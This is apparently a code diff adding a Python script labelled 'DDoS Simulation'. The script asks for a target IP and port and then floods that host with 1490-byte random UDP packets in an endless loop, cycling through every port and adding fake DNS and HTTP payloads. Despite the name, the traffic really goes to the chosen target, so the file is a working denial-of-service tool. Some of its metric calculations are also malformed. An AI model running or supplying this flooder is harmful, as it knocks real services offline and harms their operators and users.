@@ -1,0 +1,61 @@
+import os
+import time
+import socket
+import random
+from datetime import datetime
+
+# Initialization
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+os.system("clear")
+os.system("figlet DDoS Simulation")
+
+print("DDoS Simulation")
+ip = input("IP Target : ")
+port = int(input("Port : "))
+
+# Metrics initialization
+sent_packets = 0
+start_time = time.time()
+total_bits_sent = 0
+bps, pps, rps, qps = 0, 0, 0, 0
+
+def simulate_dns_query():
+    # Simulate a simple DNS query
+    query = random._urandom(100)  # Fake DNS query
+    sock.sendto(query, (ip, port))
+    return len(query)
+
+def simulate_http_request():
+    # Simulate a simple HTTP request
+    request = b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n"
+    sock.sendto(request, (ip, port))
+    return len(request)
+
+try:
+    while True:
+        # Send UDP packets
+        sock.sendto(bytes, (ip, port))
+        sent_packets += 1
+        port = port + 1 if port < 65534 else 1
+        
+        # Update metrics
+        elapsed_time = time.time() - start_time
+        total_bits_sent += len(bytes) * 8  # Convert bytes to bits
+        bps = total_bits_sent / elapsed_time
+        pps = sent_packets / elapsed_time
+        
+        # Simulate additional metrics
+        rps += simulate_http_request() / elapsed_time
+        qps += simulate_dns_query() / elapsed_time
+        
+        # Print stats
+        print(f"Sent {sent_packets} packets to {ip} through port {port}")
+        print(f"BPS: {bps:.2f}, PPS: {pps:.2f}, RPS: {rps:.2f}, QPS: {qps:.2f}")
+        
+except KeyboardInterrupt:
+    print("\nSimulation stopped.")
+    print(f"Total packets sent: {sent_packets}")
+    print(f"Final BPS: {bps:.2f}, PPS: {pps:.2f}, RPS: {rps:.2f}, QPS: {qps:.2f}")
+    sock.close()
